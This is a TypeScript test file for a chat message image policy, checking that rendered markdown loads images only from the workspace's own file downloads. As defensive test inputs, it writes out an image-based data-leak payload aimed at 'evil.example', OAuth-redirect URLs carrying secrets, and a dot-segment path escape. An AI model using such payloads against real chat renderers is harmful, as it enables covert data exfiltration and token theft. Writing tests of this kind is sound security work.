import { unified } from "unified";
import { describe, expect, it } from "vitest";
import { messageRehypePlugins } from "./markdownImagePolicy";

interface HastNode {
  type: string;
  tagName?: string;
  properties?: Record<string, unknown>;
  children?: HastNode[];
}

const sources = {
  appOrigin: "https://app.example",
  apiUrl: "https://api.example",
};

/** Run raw HTML from a message through the chat pipeline. */
function render(
  html: string,
  workspaceSlug: string | null = "acme",
  browser: typeof sources | null = sources
) {
  const tree = { type: "root", children: [{ type: "raw", value: html }] };
  const result: HastNode = unified()
    .use(messageRehypePlugins(browser, workspaceSlug))
    .runSync(tree);
  const elements: HastNode[] = [];
  const walk = (node: HastNode) => {
    if (node.type === "element") elements.push(node);
    node.children?.forEach(walk);
  };
  walk(result);
  return elements;
}

const imageSources = (html: string, workspaceSlug?: string | null) =>
  render(html, workspaceSlug)
    .filter((node) => node.tagName === "img")
    .map((node) => node.properties?.src);

describe("messageRehypePlugins", () => {
  it("drops picture sources so only the vetted img can load", () => {
    const elements = render(
      '<picture><source srcset="https://evil.example/leak?d=secret">' +
        '<img src="https://api.example/v1/workspaces/acme/files/download/a.png" alt="a"></picture>'
    );

    expect(elements.map((node) => node.tagName)).toEqual(["img"]);
    expect(elements.some((node) => "srcSet" in (node.properties ?? {}))).toBe(false);
  });

  it("loads images only from the workspace's file downloads", () => {
    expect(
      imageSources(
        '<img src="https://api.example/v1/workspaces/acme/files/download/r/chart.png">' +
          '<img src="/api/proxy/v1/workspaces/acme/files/download/r/chart.png">'
      )
    ).toEqual([
      "https://api.example/v1/workspaces/acme/files/download/r/chart.png",
      "/api/proxy/v1/workspaces/acme/files/download/r/chart.png",
    ]);
  });

  it.each([
    ["the API's OAuth redirect", "https://api.example/oauth2/auth?state=secret"],
    ["the proxy's OAuth redirect", "/api/proxy/oauth2/auth?state=secret"],
    [
      "a dot-segment escape",
      "https://api.example/v1/workspaces/acme/files/download/../../../../oauth2/auth",
    ],
    ["another workspace", "https://api.example/v1/workspaces/other/files/download/a.png"],
    ["another host", "https://evil.example/v1/workspaces/acme/files/download/a.png"],
  ])("blocks %s", (_, src) => {
    expect(imageSources(`<img src="${src}" alt="x">`)).toEqual([]);
  });

  it("blocks every remote image off a workspace page", () => {
    expect(
      imageSources('<img src="/api/proxy/v1/workspaces/acme/files/download/a.png">', null)
    ).toEqual([]);
  });

  it("loads no remote image before the browser is known, keeping alt text", () => {
    const elements = render(
      '<img src="/api/proxy/v1/workspaces/acme/files/download/a.png" alt="chart">',
      "acme",
      null
    );

    expect(elements.map((node) => node.tagName)).toEqual(["span"]);
    expect(elements[0].children).toEqual([{ type: "text", value: "chart" }]);
  });
});
